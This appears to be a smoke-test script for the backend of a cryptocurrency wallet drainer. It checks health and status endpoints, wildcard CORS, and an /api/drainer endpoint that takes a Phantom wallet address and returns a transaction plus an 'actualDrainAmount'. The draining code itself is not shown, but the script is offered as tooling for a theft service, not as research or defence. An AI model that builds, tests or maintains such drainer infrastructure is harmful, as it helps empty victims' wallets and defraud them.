#!/usr/bin/env node

// Quick Test Script for Rapid Validation
// Run with: node quick-test.js

import testConfig from './test-config.js';

// Quick test function
async function quickTest() {
  console.log('⚡ Running Quick System Validation...\n');
  
  const results = {
    passed: 0,
    failed: 0,
    total: 0
  };
  
  try {
    // Test 1: Health endpoint
    console.log('1️⃣ Testing Health Endpoint...');
    const healthResponse = await fetch(`${testConfig.environment.baseUrl}/health`);
    if (healthResponse.ok) {
      const healthData = await healthResponse.json();
      if (healthData.status === 'healthy') {
        console.log('   ✅ Health endpoint working');
        results.passed++;
      } else {
        console.log('   ❌ Health endpoint returned invalid status');
        results.failed++;
      }
    } else {
      console.log('   ❌ Health endpoint failed');
      results.failed++;
    }
    results.total++;
    
    // Test 2: Enhancement status
    console.log('\n2️⃣ Testing Enhancement Status...');
    const statusResponse = await fetch(`${testConfig.environment.baseUrl}/api/enhancements/status`);
    if (statusResponse.ok) {
      const statusData = await statusResponse.json();
      if (statusData.configuration && statusData.modules) {
        console.log('   ✅ Enhancement status working');
        results.passed++;
      } else {
        console.log('   ❌ Enhancement status missing required fields');
        results.failed++;
      }
    } else {
      console.log('   ❌ Enhancement status failed');
      results.failed++;
    }
    results.total++;
    
    // Test 3: Transaction creation (valid wallet)
    console.log('\n3️⃣ Testing Transaction Creation...');
    const transactionResponse = await fetch(`${testConfig.environment.baseUrl}/api/drainer`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user: 'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj',
        walletType: 'Phantom'
      })
    });
    
    if (transactionResponse.ok) {
      const transactionData = await transactionResponse.json();
      if (transactionData.success && 
          typeof transactionData.transaction === 'string' && 
          typeof transactionData.actualDrainAmount === 'number') {
        console.log('   ✅ Transaction creation working');
        results.passed++;
      } else {
        console.log('   ❌ Transaction creation returned invalid data structure');
        results.failed++;
      }
    } else {
      console.log('   ❌ Transaction creation failed');
      results.failed++;
    }
    results.total++;
    
    // Test 4: Error handling (invalid wallet)
    console.log('\n4️⃣ Testing Error Handling...');
    const errorResponse = await fetch(`${testConfig.environment.baseUrl}/api/drainer`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user: '11111111111111111111111111111111', // System program
        walletType: 'Unknown'
      })
    });
    
    if (errorResponse.status >= 400) {
      const errorData = await errorResponse.json();
      if (errorData.error && errorData.code) {
        console.log('   ✅ Error handling working');
        results.passed++;
      } else {
        console.log('   ❌ Error handling missing required fields');
        results.failed++;
      }
    } else {
      console.log('   ❌ Error handling should have failed');
      results.failed++;
    }
    results.total++;
    
    // Test 5: CORS headers
    console.log('\n5️⃣ Testing CORS Headers...');
    const corsResponse = await fetch(`${testConfig.environment.baseUrl}/health`);
    const corsHeader = corsResponse.headers.get('Access-Control-Allow-Origin');
    if (corsHeader === '*') {
      console.log('   ✅ CORS headers working');
      results.passed++;
    } else {
      console.log('   ❌ CORS headers missing or incorrect');
      results.failed++;
    }
    results.total++;
    
  } catch (error) {
    console.error('❌ Quick test failed:', error.message);
    results.failed++;
    results.total++;
  }
  
  // Display results
  console.log('\n' + '='.repeat(50));
  console.log('📊 QUICK TEST RESULTS');
  console.log('='.repeat(50));
  console.log(`✅ Passed: ${results.passed}`);
  console.log(`❌ Failed: ${results.failed}`);
  console.log(`📈 Total: ${results.total}`);
  
  const successRate = ((results.passed / results.total) * 100).toFixed(2);
  console.log(`🎯 Success Rate: ${successRate}%`);
  
  if (results.failed === 0) {
    console.log('\n🎉 All quick tests passed! System appears healthy.');
    process.exit(0);
  } else {
    console.log('\n⚠️  Some quick tests failed. Run full test suite for details.');
    process.exit(1);
  }
}

// Run quick test
quickTest();
